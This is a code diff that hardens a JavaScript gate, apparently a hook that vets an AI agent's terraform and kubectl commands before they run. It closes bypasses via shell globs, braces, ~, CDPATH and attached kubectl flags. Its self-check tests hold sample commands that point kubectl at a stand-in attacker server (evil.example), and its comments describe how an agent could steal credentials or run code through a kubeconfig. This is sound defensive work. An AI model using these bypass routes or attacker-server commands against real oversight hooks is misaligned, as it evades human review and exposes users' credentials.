@@ -199,9 +199,12 @@ export function terraformApply(words) {
     if (!v.includes("=") && TF_VALUE.has(name)) i++;
   }
   if (positional.length > 1) return {chdir, unreadable: "more than one plan file"};
-  // a .. is resolved here by the text and by Terraform through the symlinks on the way: no pass on it
+  // a .. is resolved here by the text and by Terraform through the symlinks on the way: no pass on it.
+  // Nor on a word the shell expands first (a glob, a brace, ~, a leading = in zsh): Reflex read the literal file.
   if ([chdir, positional[0]].some(x => x != null && /(^|\/)\.\.(\/|$)/.test(x))) exact = false;
-  return {chdir, plan: positional[0] ?? null, exact};
+  if (words.slice(1).some(w => !/^[\w./@:+=,-]+$/.test(w.raw) || /^=/.test(w.raw) || /^--?chdir==/.test(w.raw))) exact = false;
+  const home = x => x != null && /^~\//.test(x) ? join(homedir(), x.slice(2)) : x;   // read the file the shell will name
+  return {chdir: home(chdir), plan: home(positional[0]) ?? null, exact};
 }
 // kubectl [globals] apply|delete|replace|patch ...; the verb is the first word that is one of them
 // and not the value of a global option that takes one.
@@ -211,7 +214,8 @@ export function kubectlChange(words) {
   for (let i = 1; i < words.length; i++) {
     const v = words[i].value;
     if (KUBE_VALUE.has(v)) { i++; continue; }
-    if (v.startsWith("-")) continue;
+    // before the verb only the flags known above: an unknown one may take the next word as its value
+    if (v.startsWith("-")) { if (!/^--?[\w-]+=/.test(v) || !KUBE_VALUE.has(v.split("=")[0])) return null; continue; }
     if (!["apply", "delete", "replace", "patch"].includes(v)) return null;
     const args = words.map(w => w.value);
     // apply's subcommands (edit-last-applied, set-last-applied, view-last-applied) write or open an editor
@@ -244,7 +248,8 @@ function kubeCheck(k, dir, s, deadline, env) {
   if (a.some(x => /^--dry-run(=|$)|^--raw(=|$)|^--edit$|^--?$/.test(x)) || a.some((x, i) => (/^(-f|--filename)$/.test(x) && a[i + 1] === "-") || /^(-f-|--filename=-)$/.test(x))) return null;
   // not with a kubeconfig, server or token the command names (it could be the agent's: an exec
   // credential plugin runs code, a server of its own receives the user's credentials), nor its own -o
-  if (a.some(x => /^(--kubeconfig|--server|-s|--token|-o|--output)(=|$)|^-o\S/.test(x))) return null;
+  // (cobra reads global flags anywhere, attached shorthand values too: -shttps://..., -oyaml)
+  if (a.some(x => /^(--kubeconfig|--server|-s|--token|-o|--output|--username|--password)(=|$)|^-[os]\S/.test(x))) return null;
   if (String(env.KUBECONFIG ?? "").split(":").some(f => f && (!isAbsolute(f) || (dir + "/").startsWith(resolve(f, "..") + "/") || resolve(f).startsWith(dir + "/")))) return null;
   const bin = which("kubectl", env.PATH);
   if (!bin || deadline - Date.now() < 50) return null;
@@ -292,7 +297,9 @@ export function planGate({command, cwd, settings: s, settingsAt = () => s, prod,
       if (!w.length) continue;
       if (w[0].value === "cd") {
         const to = w[1]?.value;
-        dir = !cdOk || segs.length > 1 || w.length > 2 || !to || to === "-" || /^~[^/]/.test(to) || !dir && !isAbsolute(to) && !to.startsWith("~") ? null
+        // CDPATH sends a relative cd elsewhere; a glob or brace names what the shell finds
+        dir = !cdOk || segs.length > 1 || w.length > 2 || !to || to === "-" || /^~[^/]/.test(to) || !/^[\w./@:+,~-]+$/.test(w[1].raw) ||
+          (env.CDPATH && !/^[/~.]/.test(to)) || !dir && !isAbsolute(to) && !to.startsWith("~") ? null
           : to.startsWith("~") ? join(homedir(), to.slice(1)) : resolve(dir ?? "/", to);
         if (/(^|\/)\.\.(\/|$)/.test(to ?? "")) dotdot = true;
         if (ps.length > 1 && /[()]/.test(p.core)) dir = null;   // a subshell's cd: not followed
@@ -424,6 +431,11 @@ async function selfcheck() {
       assert.ok(r && r.outcome !== "pass" && r.plan?.create === 1, `no pass, the counts kept: ${c} ${JSON.stringify(r)}`);
     }
     assert.equal(gate("terraform apply clean.plan", w, {}, () => false, {...env, TF_CLI_ARGS_apply: "-destroy"}).outcome, null, "TF_CLI_ARGS in the hook's environment");
+    // review round 2: words the shell expands before terraform sees them
+    put(w, "[t]fplan", fixture("clean"));
+    for (const c of ["terraform apply [t]fplan", "terraform apply {clean,x}.plan", "terraform apply ~/w/clean.plan", "terraform apply =clean.plan", "cd [s]ub && terraform apply tfplan"])
+      assert.notEqual(gate(c, w)?.outcome, "pass", `an expanded word: ${c}`);
+    assert.equal(gate("cd sub && terraform apply tfplan", w, {}, () => false, {...env, CDPATH: "/elsewhere"}).id, "plan-unreadable", "CDPATH in the hook's environment");
     // symlinks: the physical path is what Terraform opens; production by the physical directory
     symlinkSync(join(w, "sub"), join(w, "lnk"));
     mkdirSync(join(w, "far/deep"), {recursive: true}); put(join(w, "far"), "clean.plan", fixture("destroy")); symlinkSync(join(w, "far/deep"), join(w, "lnk2"));
@@ -526,7 +538,8 @@ async function selfcheck() {
     gate("kubectl delete pod web-1 --field-manager", w, k, () => false, kenv({KUBE_NAMES: "pod/web-1\n"}));
     assert.equal(readFileSync(log, "utf8").trim().split("\n").at(-1), "kubectl delete --dry-run=server -o name pod web-1 --field-manager");
     for (const c of ["kubectl --kubeconfig ./kc delete pod x", "kubectl --server https://evil.example delete pod x", "kubectl delete pod x -o yaml",
-                     "kubectl delete pod x --output=json", "kubectl --token=t delete pod x"])
+                     "kubectl delete pod x --output=json", "kubectl --token=t delete pod x", "kubectl -shttps://evil.example delete pod x",
+                     "kubectl delete pod x -shttps://evil.example", "kubectl --as-uid patch create -f x", "kubectl -v 9 delete pod x"])
       assert.equal(gate(c, w, k, () => false, kenv({KUBE_NAMES: "pod/x\n"})), null, `not run: ${c}`);
     assert.equal(gate("kubectl delete pod x", w, k, () => false, kenv({KUBE_NAMES: "pod/x\n", KUBECONFIG: join(w, "kc")})), null, "a KUBECONFIG inside the working directory");
 
